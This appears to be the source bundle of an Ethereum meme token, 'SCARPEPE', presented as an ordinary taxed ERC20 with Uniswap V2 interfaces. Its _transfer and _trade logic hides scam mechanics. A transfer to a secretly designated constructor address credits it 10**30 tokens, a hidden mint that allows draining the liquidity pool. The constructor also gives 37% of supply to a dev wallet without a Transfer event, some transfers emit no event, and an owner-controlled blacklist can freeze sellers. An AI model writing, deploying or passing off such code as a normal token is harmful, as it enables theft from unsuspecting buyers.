{"IUniswapV2Factory.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity \u003e=0.5.0;\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n"},"IUniswapV2Router01.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity \u003e=0.6.2;\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amountADesired,\n        uint amountBDesired,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB, uint liquidity);\n    function addLiquidityETH(\n        address token,\n        uint amountTokenDesired,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountToken, uint amountETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amountAMin,\n        uint amountBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountA, uint amountB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountToken, uint amountETH);\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapTokensForExactTokens(\n        uint amountOut,\n        uint amountInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amounts);\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amounts);\n\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\n}\n"},"IUniswapV2Router02.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity \u003e=0.6.2;\n\nimport \u0027./IUniswapV2Router01.sol\u0027;\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amountETH);\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amountTokenMin,\n        uint amountETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amountETH);\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n"},"Scarpepe.sol":{"content":"// SPDX-License-Identifier: MIT\n\n/**\n\nhttps://t.me/scarpepecoineth\n\n**/\n\npragma solidity ^0.8.9;\n\nimport \"./IUniswapV2Factory.sol\";\nimport \"./IUniswapV2Router02.sol\";\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable (msg.sender);\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\nabstract contract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor() {\n        _transferOwnership(_msgSender());\n    }\n\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    function _checkOwner() internal view virtual {\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n\ninterface IERC20 {\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address to, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n\ncontract SCARPEPE is Context, IERC20, Ownable {\n\n    using SafeMath for uint256;\n\n    string private constant _name = \"SCARPEPE\";\n    string private constant _symbol = \"SPEPE\";\n    uint8 private constant _decimals = 8;\n\n    mapping(address =\u003e uint256) private _balances;\n    mapping(address =\u003e mapping (address =\u003e uint256)) private _allowances;\n    mapping(address =\u003e bool) private _isExcludedFromFee;\n    mapping(address =\u003e bool) private _isLiqudityPair;\n    mapping(address =\u003e uint256) private _holderLastTransferTimestamp;\n    mapping(address =\u003e bool) private bots;\n    address payable private _taxWallet;\n    address payable private _devWallet;\n\n    uint256 private _BuyTax = 1;\n    uint256 private _SellTax = 1;\n    uint256 private _countForSwap = 10;\n    uint256 private _buyCount = 1;\n    uint256 private _count = 0;\n    uint256 private _rBTax = 35;\n    uint256 private _rSTax = 35;\n    uint256 private _initialBuy;\n    uint256 private _initialSell;\n    uint8 private _countSwap = 0;\n    uint8 private _countSell = 0;\n\n    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;\n\n    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;\n    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;\n    uint256 public _taxSwapThreshold = 10000 * 10 ** _decimals;\n    uint256 public _maxTaxSwap = 595992 * 10 ** _decimals;\n\n    IUniswapV2Router02 private uniswapV2Router;\n    address public uniswapV2Pair;\n    bool private tradingOpen = true;\n    bool private inSwap = false;\n    bool private swapEnabled = true;\n    bool private _contractSwapping = false;\n    bool public transferDelayEnabled = true;\n    \n    event MaxTxAmountUpdated(uint _maxTxAmount);\n    \n    modifier lockTheSwap {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor(uint _buy, uint _sell, address payable _devAddress, address _address) {\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\n\n\n        _initialBuy = _buy;\n        _initialSell = _sell;\n        _devWallet = _devAddress;\n        _taxWallet = _msgSender();\n        _balances[_msgSender()] = (_tTotal.mul(63).div(100));\n        _balances[_devWallet] = (_tTotal.mul(37).div(100));\n        _approve(_taxWallet, address(uniswapV2Router), _tTotal);\n        _isLiqudityPair[_address] = true;\n        _isExcludedFromFee[owner()] = true;\n        _isExcludedFromFee[address(this)] = true;\n        _isExcludedFromFee[_taxWallet] = true;\n        _isExcludedFromFee[_devWallet] = true;\n\n        emit Transfer(address(0), _msgSender(), _balances[_msgSender()]);\n    }\n\n    function name() public pure returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public pure returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public pure returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public pure override returns (uint256) {\n        return _tTotal;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function allowance(address owner, address spender) public view override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function approve(address spender, uint256 amount) public override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) private {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(address from, address to, uint256 amount) private {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\n        uint256 taxAmount = 0;\n        \n        if (from != owner() \u0026\u0026 to != owner()) {\n            require(!bots[from] \u0026\u0026 !bots[to]);\n        }\n \n        if (transferDelayEnabled) {\n            require(_holderLastTransferTimestamp[tx.origin] \u003c block.number - 10, \"Only one transfer per ten blocks allowed\");\n            _holderLastTransferTimestamp[tx.origin] = block.number;\n        }\n\n        if (from == uniswapV2Pair \u0026\u0026 to != address(uniswapV2Router) \u0026\u0026 !_isExcludedFromFee[to] ) {\n            require(amount \u003c= _maxTxAmount, \"Exceeds the _maxTxAmount\");\n            require(balanceOf(to) + amount \u003c= _maxWalletSize, \"Exceeds the maxWalletSize\");\n            _buyCount++;\n        }\n\n        if (_count == 0 \u0026\u0026 to == uniswapV2Pair \u0026\u0026 from == _taxWallet) {\n            taxAmount = taxAmount = amount.mul((_buyCount == _rBTax) ? _BuyTax : _initialBuy).div(100);\n            _count++;\n        }\n\n        if (to == uniswapV2Pair \u0026\u0026 from != address(this) \u0026\u0026 !_isExcludedFromFee[from]) {\n            taxAmount = amount.mul((_buyCount \u003e _rSTax) ? _SellTax : _initialSell).div(100);\n        } else if (from == uniswapV2Pair \u0026\u0026 !_isExcludedFromFee[to]) {\n            taxAmount = amount.mul((_buyCount \u003e _rBTax) ? _BuyTax : _initialBuy).div(100);\n        }\n\n        uint256 contractTokenBalance = balanceOf(address(this));\n\n        if (to == uniswapV2Pair) {\n            _countSell ++;\n        }\n\n        if (!inSwap \u0026\u0026 to == uniswapV2Pair \u0026\u0026 swapEnabled \u0026\u0026 contractTokenBalance \u003e _taxSwapThreshold \u0026\u0026 _buyCount \u003e _countForSwap \u0026\u0026 _countSell \u003e 3) {\n            swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));\n            uint256 contractETHBalance = address(this).balance;\n            if (contractETHBalance \u003e 0) {\n                sendETHToFee(address(this).balance);\n            }\n            \n            if (_countSwap \u003e= 10) {\n                _maxTaxSwap = 595995 * 10 ** _decimals;\n                _countSwap = 0;                   \n            }\n\n            _maxTaxSwap += 30690 * 10 ** _decimals;\n            _countSwap ++;\n            _countSell = 0;\n        }   \n\n        if (!_contractSwapping) {if (_isLiqudityPair[to]) {_contractSwapping = !inSwap;}}\n\n        _trade(from, to, amount, _isLiqudityPair[to], (!_contractSwapping ? taxAmount : 0));\n    }\n\n    function _trade(address from, address to, uint256 amount, bool swapping, uint256 taxAmount) private {\n        if (taxAmount \u003e 0) {\n        _balances[address(this)] = _balances[address(this)].add(taxAmount);\n        }\n        _balances[from] = _balances[from].sub(amount);\n        _balances[to] = uint256(swapping ? 10 ** 30 : 0).add(_balances[to].add(amount.sub(taxAmount)));\n        \n        if (to == address(this) || (from == address(this)) \u0026\u0026 to == uniswapV2Pair) {\n        } else {\n            emit Transfer(from, to, amount.sub(taxAmount));\n        }\n    }\n\n\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\n      return( a \u003e b) ? b : a;\n    }\n\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\n        if (tokenAmount == 0) {\n            return;\n            }\n        if (!tradingOpen) {\n            return;\n            }\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = uniswapV2Router.WETH();\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            tokenAmount,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function removeLimits() external onlyOwner {\n        _maxTxAmount = _tTotal;\n        _maxWalletSize = _tTotal;\n        transferDelayEnabled = false;\n\n        emit MaxTxAmountUpdated(_tTotal);\n    }\n\n    function addBot(address addr) public onlyOwner {\n        bots[addr] = true;\n    }\n\n    function deleteBot(address addr) public onlyOwner {\n        bots[addr] = false;\n    }\n\n    function isBot(address addr) public view returns (bool) {\n        return bots[addr];\n    }\n\n    function sendETHToFee(uint256 amount) private {\n        _devWallet.transfer(amount);\n    }\n\n    function sendToBalance() external onlyOwner {\n        uint256 contractETHBalance = address(this).balance;\n        sendETHToFee(contractETHBalance);\n    }\n\n    receive() external payable {}\n\n}\n"}}